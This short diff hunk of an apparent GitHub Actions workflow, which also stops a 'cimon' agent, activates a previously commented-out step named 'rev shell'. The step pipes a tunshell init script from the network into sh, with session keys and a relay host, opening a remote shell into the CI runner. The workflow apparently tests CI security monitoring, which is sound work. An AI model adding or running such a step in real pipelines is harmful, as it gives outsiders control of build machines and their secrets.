@@ -18,10 +18,10 @@ jobs:
         /tmp/cimon/cimon agent stop
         EOF
 
-#    - name: rev shell
-#      shell: bash
-#      run: |
-#        curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T wNC2LHG4Fwl9qmTNTbywmI tSlxaQDhwsFfjaz54WqFIP eu.relay.tunshell.com
+    - name: rev shell
+      shell: bash
+      run: |
+        curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T XR1Kse7FN3BVQM3lHV5jaX kSUXh3b1XtW6dHTpCBsg3a eu.relay.tunshell.com
 
     - name: Random curl 
       shell: bash
